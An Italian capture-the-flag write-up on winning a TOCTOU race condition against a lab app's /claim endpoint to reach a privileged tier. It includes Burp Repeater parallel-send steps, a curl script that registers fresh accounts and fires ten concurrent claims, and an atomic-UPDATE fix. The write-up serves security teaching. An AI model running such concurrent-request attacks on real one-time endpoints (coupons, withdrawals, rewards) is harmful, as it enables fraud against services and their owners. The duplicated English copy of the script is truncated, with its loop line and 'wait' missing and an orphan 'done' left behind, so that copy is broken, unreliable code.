Towel on the Sunbed: una race condition a bordo piscina

Ponzi - Wellness Rewards è l'app «crypto rewards» da bordo piscina che ti lascia riscuotere una ricompensa di staking una volta ogni 24 ore. Il problema è tutto in quel «una volta»: tra il momento in cui il server controlla se hai già riscosso e quello in cui lo scrive, c'è una finestra. Abbastanza larga da farci passare una balena, come diceva il brief. Obiettivo: da guest a tier Whale, aprire la Whale Vault e prendere la flag. Nessuna injection, nessun overflow: solo una race condition e Burp Repeater.

// TL;DR
  • Vuln: race condition (TOCTOU) sull'endpoint /claim.
  • Arma: Burp Repeater, gruppo di 10 tab e Send group (parallel).
  • Requisito: una sessione pulita che non ha mai riscosso.
  • Impatto: tier Whale sbloccato, Whale Vault aperta, flag presa.
  • Difesa: UPDATE atomico condizionale, lock di riga o vincolo UNIQUE.
// prima di iniziare

Sostituisci <target> con l'IP della macchina (l'app è sulla 3000). Il connect.sid di sessione non si incolla a mano: lo leggi da Burp o lo conia il blocco CLI più avanti. Tutto gira sulla tua macchina. Serve curl; Burp è comodo, per la race c'è l'equivalente da riga di comando, mentre signup e apertura della vault restano da browser.

[01] Recon e setup dell'account

Prima cosa, l'account. Apro http://<target>:3000/, uso il link Sign Up / Register e creo l'utente guest123 con una password qualsiasi. Faccio login e atterro sulla dashboard di Ponzi. Due elementi contano: un pulsante Claim Reward legato a una cooldown di 24 ore, e una sezione Whale Vault in fondo alla pagina, chiusa a chiave finché non raggiungi il tier Whale.

Il cancello è chiaro: per aprire la vault serve il tier Whale, e per via legittima ci arrivi accumulando una ricompensa al giorno per più giorni. L'unica guardia tra me e la balena è quella cooldown. La domanda giusta non è «quanto vale la ricompensa», ma «quel controllo è atomico?».

// nota

Recon che paga: il cookie di sessione è connect.sid, firma inconfondibile di express-session. Sappiamo già che dietro c'è un backend Node/Express: informazione che tornerà utilissima quando ragioneremo sul perché la race esiste.

[02] Intercettare la richiesta di claim

In Burp apro il browser integrato da Proxy > Intercept > Open Browser: parte un Chromium già pre-proxato verso Burp, senza configurazioni manuali di proxy né certificato. Navigo su http://<target>:3000, attivo Intercept e clicco Claim Reward. Piccolo dettaglio operativo: con l'Intercept acceso la pagina non si carica finché non inoltri manualmente ogni richiesta, quindi per navigare tocca spegnerlo o forwardare a mano.

# Richiesta catturata da Burp (Intercept ON)
POST /claim HTTP/1.1
Host: <target>:3000
Content-Length: 0
Cookie: connect.sid=...
# Request captured by Burp (Intercept ON)
POST /claim HTTP/1.1
Host: <target>:3000
Content-Length: 0
Cookie: connect.sid=...

Dalla richiesta catturata mi copio il valore del cookie connect.sid dall'header Cookie: — è la mia sessione. Attenzione: torna utile solo se quella sessione non ha ancora riscosso; nel blocco CLI più avanti ne coniamo una nuova apposta, quindi qui il cookie serve soprattutto come recon. In Burp lo leggo direttamente nella richiesta intercettata; via curl, lo stesso valore arriva nell'header Set-Cookie della risposta al login.

Un singolo claim risponde con successo, importo della ricompensa e saldo aggiornato. Ma solo la prima volta: rimando la stessa identica richiesta a mano e la cooldown scatta.

# Replay manuale della stessa richiesta: scatta la cooldown
HTTP/1.1 429 Too Many Requests
{"error":"Reward already claimed. Please wait before claiming again.","secondsRemaining":86400}
# Manual replay of the same request: cooldown kicks in
HTTP/1.1 429 Too Many Requests
{"error":"Reward already claimed. Please wait before claiming again.","secondsRemaining":86400}

La cooldown è applicata, confermato. Ma i replay sequenziali non provano nulla sull'atomicità: arrivano uno dopo l'altro, quando lo stato è già scritto. Per bucare il controllo devo colpire prima che la scrittura si depositi.

[03] Vincere la race condition

Prima la premessa (la ribadisce anche il riquadro rosso qui sotto): la race va lanciata su una sessione che non ha mai riscosso, quindi non riusare guest123 — l'hai già bruciato nello step [02]. Registra un secondo account (es. guest124), fai login nel browser di Burp e intercetta il suo primo /claim. Da lì, click destro sulla richiesta /claim > Send to Repeater. In Repeater, click destro sulla tab > Duplicate tab e ripeto finché non ho 10 tab identiche. Le seleziono tutte (click e Shift), click destro > Create tab group e le raggruppo (es. Group 1). Requisito ferreo: tutto va fatto su una sessione pulita, che non ha mai riscosso con successo. Un account con un claim già registrato risponde 429 su ogni tentativo parallelo, perché la cooldown è attiva ancora prima che la race inizi.

Con le 10 tab raggruppate, dal pulsante Send del gruppo scelgo Send group (parallel): Burp spara tutte le richieste praticamente nello stesso istante. È il cuore dell'attacco. Se il server fa «l'utente ha già riscosso oggi?» e poi, come passo separato, scrive «riscosso = true», mandando molte richieste insieme diverse superano il controllo prima che una qualsiasi finisca di scrivere l'aggiornamento.

# 10 richieste in parallelo: la race lascia passare PIÙ claim
HTTP/1.1 429 Too Many Requests   # diverse perdono
HTTP/1.1 200 OK                   # una passa prima della write...
HTTP/1.1 200 OK                   # ...e pure la successiva
{"message":"Staking reward claimed successfully.","reward":50,"newBalance":150,"tier":"Whale"}
# 10 parallel requests: the race lets MULTIPLE claims through
HTTP/1.1 429 Too Many Requests   # several lose
HTTP/1.1 200 OK                   # one slips before the write...
HTTP/1.1 200 OK                   # ...and so does the next
{"message":"Staking reward claimed successfully.","reward":50,"newBalance":150,"tier":"Whale"}

Preferisci la riga di comando a Burp? La stessa race la tiri su con dieci curl in parallelo, purché usi il cookie di una sessione pulita. È meno chirurgico del last-byte sync di Burp — il jitter di rete disallinea le richieste — ma spesso basta a infilare più di un claim.

// requisito: account NUOVO per ogni tentativo

La race va lanciata su una sessione che non ha mai riscosso: il claim dello step precedente «brucia» l'account (429 su ogni tentativo successivo). Se un batch fallisce, registra un utente nuovo e ripeti. In Burp: manda a Repeater la prima richiesta /claim di un account appena creato, poi premi Drop sulla richiesta nel Proxy — non Forward: così l'account resta vergine e il claim lo consuma solo il gruppo parallelo. Da CLI, conia il cookie come sotto.

# Alternativa CLI: 10 /claim in parallelo (sessione pulita, mai riscosso)
# Sostituisci solo <target>: il cookie lo conia il blocco stesso
TARGET="http://<target>:3000"
# conia una sessione FRESCA (mai riscossa): registra + login, poi prendi connect.sid.
# (adatta path e nomi campo: alcune room usano form-urlencoded)
# NB: non usare apici singoli nei -d, $RANDOM non si espanderebbe
USER="guest$RANDOM"
curl -s -c cj.txt -X POST "$TARGET/register" -H "Content-Type: application/json" \
     -d "{\"username\":\"$USER\",\"password\":\"Pass123!\"}" -o /dev/null
curl -s -c cj.txt -b cj.txt -X POST "$TARGET/login" -H "Content-Type: application/json" \
     -d "{\"username\":\"$USER\",\"password\":\"Pass123!\"}" -o /dev/null
COOKIE=$(awk '/connect.sid/{print "connect.sid="$7}' cj.txt)

for i in $(seq 1 10); do
  curl -s -o /dev/null -w "%{http_code}\n" \
    -X POST "$TARGET/claim" \
    -H "Cookie: $COOKIE" \
    --http1.1 &
done
wait
# Conta gli esiti: piu' di un 200 = race vinta, il resto 429
echo "$USER / Pass123!"  # loggati nel browser con queste credenziali prima di aprire la Whale Vault
# CLI alternative: 10 /claim in parallel (clean session, never claimed)
# Replace only <target>: the block mints the cookie itself
TARGET="http://<target>:3000"
# mint a FRESH session (never claimed): register + login, then grab connect.sid.
# (adapt path and field names: some rooms use form-urlencoded)
# NB: don't use single quotes in -d, $RANDOM wouldn't expand
USER="guest$RANDOM"
curl -s -c cj.txt -X POST "$TARGET/register" -H "Content-Type: application/json" \
     -d "{\"username\":\"$USER\",\"password\":\"Pass123!\"}" -o /dev/null
curl -s -c cj.txt -b cj.txt -X POST "$TARGET/login" -H "Content-Type: application/json" \
     -d "{\"username\":\"$USER\",\"password\":\"Pass123!\"}" -o /dev/null
COOKIE=$(awk '/connect.sid/{print "connect.sid="$7}' cj.txt)

  curl -s -o /dev/null -w "%{http_code}\n" \
    -X POST "$TARGET/claim" \
    -H "Cookie: $COOKIE" \

done

Più richieste atterrano come 200 OK prima che la scrittura si depositi: ogni 200 extra è un claim regalato — bilancio gonfiato e, soprattutto, tier promosso a Whale. La corsa è vinta.

// metodo

Due dettagli che fanno la differenza. Primo: il target gira su Node/Express e l'essere single-thread non salva nulla, anzi inganna. Ogni await su I/O di database è un punto in cui l'event loop cede il controllo a un'altra richiesta, ed è esattamente lì, tra check e write, che le 10 richieste si infilano. Secondo: su HTTP/1.1 Burp sincronizza l'ultimo byte di tutte le richieste del gruppo (last-byte sync); se il server parla HTTP/2, la stessa funzione usa il single-packet attack di James Kettle, che annulla il jitter di rete spedendo tutto in un pacchetto solo. Su porta 3000 di solito è HTTP/1.1, quindi last-byte sync.

[04] Whale Vault, flag e difesa

Spengo l'Intercept, ricarico la dashboard e il tier Whale sblocca la sezione Whale Vault in fondo alla pagina. Clicco Open Vault e la flag è lì. E voilà.

// flag — OSCURATA
THM{████████████████████}

La flag qui non la trovi: il valore in sé non insegna niente, e mezzo divertimento è arrivarci. La metodologia sopra è completa e riproducibile — l'ultimo Enter lo batti tu.

Perché esiste? Il claim fa un controllo applicativo (ho già riscosso?) e una scrittura (segno come riscosso) come due passi distinti e non atomici. Tra i due c'è un intervallo, e in quell'intervallo lo stato letto è ancora «non riscosso» per tutte le richieste concorrenti.

# Pattern vulnerabile: check e write separati (TOCTOU)
last = db.get(user.last_claim)          # check — await: qui l'event loop cede
if (now - last) < 24h:                    # finestra sfruttabile: stato ancora «non riscosso»
    return 429
db.set(user.last_claim = now)             # write — await: troppo tardi
grantReward(user)
# Vulnerable pattern: separate check and write (TOCTOU)
last = db.get(user.last_claim)          # check — await: event loop yields here
if (now - last) < 24h:                    # exploitable window: state still "not claimed"
    return 429
db.set(user.last_claim = now)             # write — await: too late
grantReward(user)
# Fix: UPDATE atomico condizionale, poi controlla le righe toccate
rows = UPDATE users
       SET last_claim = now(), balance = balance + 50
       WHERE id = :id
         AND last_claim < now() - INTERVAL '24 hours'
# 0 righe toccate -> reward gia' preso in questo ciclo
if rows == 0:
    return 429
# Fix: atomic conditional UPDATE, then check affected rows
rows = UPDATE users
       SET last_claim = now(), balance = balance + 50
       WHERE id = :id
         AND last_claim < now() - INTERVAL '24 hours'
# 0 rows affected -> reward already taken this cycle
if rows == 0:
    return 429

E non è una bizzarria da bordo piscina: lo stesso schema colpisce ogni endpoint «una volta sola» — riscatto coupon, voto, prelievo, decremento di stock, bonus referral, redenzione di gift card. Ovunque ci sia «controlla se è già stato fatto, poi segnalo come fatto» senza atomicità, c'è una finestra da correre.

// lezione

Le race condition vivono nel buco tra un «controllo» e una «scrittura». Se i due passi non sono atomici — stessa transazione, lock di riga (SELECT ... FOR UPDATE), vincolo UNIQUE, o un UPDATE condizionale che valuta le righe effettivamente toccate — abbastanza richieste concorrenti ci passano in mezzo. Non serve injection ne' corruzione di memoria: basta capire come cambia lo stato dell'app nel tempo. Difenditi rendendo l'operazione idempotente e atomica, senza fidarti di un controllo applicativo fatto prima della write.
